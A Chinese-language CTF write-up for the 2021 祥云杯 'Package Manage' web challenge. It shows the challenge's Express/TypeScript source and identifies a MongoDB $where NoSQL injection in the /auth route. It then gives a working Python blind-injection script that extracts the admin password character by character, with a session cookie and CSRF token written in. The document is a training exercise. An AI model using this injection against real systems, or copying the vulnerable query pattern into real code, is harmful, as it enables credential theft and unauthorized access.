# 祥云杯 2021

## Package Manage

> *2021/09/06*

### 题目

进去首先是个页面，展示了很多前端框架

![xyb20211](img/祥云杯2021/祥云杯20211.png)

给了源代码，后台主要是用ts写的，主要的逻辑在`index.ts`里

```typescript
import *  as express from "express";
import { User } from "../schema";
import { checkmd5Regex } from "../utils";

const router = express.Router();

router.get('/', (_, res) => res.render('index'))

router.get('/login', (_, res) => res.render('login'))

router.post('/login', async (req, res) => {
	let { username, password } = req.body;
	if (username && password) {
		if (username == '' || typeof (username) !== "string" || password == '' || typeof (password) !== "string") {
			return res.render('login', { error: 'Parameters error' });
		}
		const user = await User.findOne({ "username": username })
		if (!user || !(user.password === password)) {
			return res.render('login', { error: 'Invalid username or password' });
		}
		req.session.userId = user.id
		res.redirect('/packages/list')
	} else {
		return res.render('login', { error: 'Parameters cannot be blank' });
	}
})

router.get('/register', (_, res) => res.render('register'))

router.post('/register', async (req, res) => {
	let { username, password, password2 } = req.body;
	if (username && password && password2) {
		if (username == '' || typeof (username) !== "string" || password == '' || typeof (password) !== "string" || password2 == '' || typeof (password2) !== "string") {
			return res.render('register', { error: 'Parameters error' });
		}
		if (password != password2) {
			return res.render('register', { error: 'Password do noy match' });
		}
		if (await User.findOne({ username: username })) {
			return res.render('register', { error: 'Username already taken' });
		}
		try {
			const user = new User({ "username": username, "password": password, "isAdmin": false })
			await user.save()
		} catch (err) {
			return res.render('register', { error: err });
		}
		res.redirect('/login');
	} else {
		return res.render('register', { error: 'Parameters cannot be blank' });
	}
})

router.get('/logout', (req, res) => {
	req.session.destroy(() => res.redirect('/'))
})


router.get('/auth', (_, res) => res.render('auth'))

router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});


export default router;
```

其实在`/auth`逻辑中，有一句``let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()``，这句代码是包含noSQL注入的，而在后台`schema.ts`里可以看到数据库是`mongodb`，脚本跑一下就行了，拿到密码直接登录就可以

### payload

```python
import requests
import string

url = "http://e4b7e7b4-7393-42ab-bd37-6e4a0cb6b064.node4.buuoj.cn:81/auth"
headers = {
    "Cookie":
    "UM_distinctid=17b4f2f7a461345-02cbe73321b5b-4343363-384000-17b4f2f7a47726; session=s%3APkDewey4yEgT6r7zDdglqWKICJthgKdP.CT9Gfpv7tOrEfTpU8MM91vjoOdnhZOKV4HZ9G%2BYIChc",
    "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Referer":
    "http://e4b7e7b4-7393-42ab-bd37-6e4a0cb6b064.node4.buuoj.cn:81/auth",
    "Origin": "http://e4b7e7b4-7393-42ab-bd37-6e4a0cb6b064.node4.buuoj.cn:81",
    "Accept":
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Upgrade-Insecure-Requests": "1",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(
            i, j)
        #print(payload)
        data = {
            "_csrf": "MNC6g3k7-2IREOUshu9MxXXB_ZSJmRKFdLhE",
            "token": payload
        }

        r = requests.post(url=url,
                          data=data,
                          headers=headers,
                          allow_redirects=False)
        print(r.status_code)
        #print(payload)
        print(flag)
        if "Found. Redirecting to" in r.text:
            flag += j
            #print(flag)
            break
```

